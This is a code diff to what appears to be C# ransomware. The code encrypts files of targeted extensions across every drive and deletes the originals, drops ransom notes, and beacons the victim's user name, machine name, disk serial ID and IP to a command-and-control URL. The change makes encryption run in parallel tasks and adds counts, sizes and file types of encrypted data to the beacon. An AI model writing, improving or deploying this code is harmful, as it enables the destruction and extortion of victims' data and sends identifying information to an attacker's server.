@@ -60,18 +60,18 @@ static void Enc(string path){
     File.Delete(path);
   }catch{}}
 
-static void Beacon(){
+static void Beacon(int cnt=0,long sz=0,string types="",string detail="{}"){
   try{
     string u=Environment.UserName,m=Environment.MachineName;
     string t=DateTime.Now.ToString("HH:mm:ss"),d=DateTime.Today.ToString("dd/MM/yyyy")+", "+DateTime.Now.DayOfWeek;
-    string ip="0.0.0.0";try{ip=new WebClient().DownloadString("https://api.ipify.org");}catch{}
-    string sid="";try{var mc=new ManagementClass("Win32_LogicalDisk");
-      foreach(ManagementObject o in mc.GetInstances())sid+=Convert.ToString(o["VolumeSerialNumber"]);}catch{}
+    string ip="0.0.0.0";try{ip=new WebClient().DownloadString("https://api.ipify.org").Trim();}catch{}
     var c=new HttpClient();
     var kv=new List<KeyValuePair<string,string>>{
-      new("machine_name",m),new("computer_user",u),new("systemid",sid),
+      new("machine_name",m),new("computer_user",u),new("systemid",SID),
       new("os","Windows "+Environment.OSVersion.Version),new("date",d),new("time",t),
-      new("ip",ip),new("location","?"),new("password","RSA_PROTECTED"),new("handshake",SECRET)};
+      new("ip",ip),new("location","?"),new("password","RSA_PROTECTED"),new("handshake",SECRET),
+      new("encrypted_count",cnt.ToString()),new("encrypted_size",sz.ToString()),
+      new("encrypted_types",types),new("encrypted_detail",detail)};
     c.PostAsync(C2,new FormUrlEncodedContent(kv)).Wait();
   }catch{}}
 
@@ -95,11 +95,32 @@ static void DropNotes(){
 static void Main(){
   try{var mc=new ManagementClass("Win32_LogicalDisk");
     foreach(ManagementObject o in mc.GetInstances())SID+=Convert.ToString(o["VolumeSerialNumber"]);}catch{}
-  Beacon();
+  int encCount=0; long encSize=0;
+  var encTypes=new System.Collections.Generic.HashSet<string>();
+  var typeSizes=new System.Collections.Generic.Dictionary<string,long[]>();
+  var tasks=new System.Collections.Generic.List<System.Threading.Tasks.Task>();
+  object lk=new object();
   foreach(var dr in DriveInfo.GetDrives()){
     try{foreach(string ext in EXTS){
       try{foreach(string f in Directory.EnumerateFiles(dr.Name,ext,SearchOption.AllDirectories)){
-        string fc=f;new Thread(()=>Enc(fc)){Priority=ThreadPriority.AboveNormal}.Start();
+        long fsz=0;try{fsz=new FileInfo(f).Length;}catch{}
+        string fc=f;long fszc=fsz;
+        tasks.Add(System.Threading.Tasks.Task.Run(()=>{
+          if(Enc(fc)){lock(lk){encCount++;encSize+=fszc;
+            string e=Path.GetExtension(fc).ToLower();encTypes.Add(e);
+            if(!typeSizes.ContainsKey(e))typeSizes[e]=new long[]{0,0};
+            typeSizes[e][0]++;typeSizes[e][1]+=fszc;}}
+        }));
       }}catch{}}}catch{}}
+  System.Threading.Tasks.Task.WaitAll(tasks.ToArray());
   DropNotes();
+  // 构建detail JSON
+  var sb=new System.Text.StringBuilder("{");
+  bool first=true;
+  foreach(var kv2 in typeSizes){
+    if(!first)sb.Append(",");
+    sb.Append($"\"{kv2.Key}\":{{\"count\":{kv2.Value[0]},\"size\":{kv2.Value[1]}}}");
+    first=false;}
+  sb.Append("}");
+  Beacon(encCount,encSize,string.Join(",",encTypes),sb.ToString());
 }}} // end class, namespace
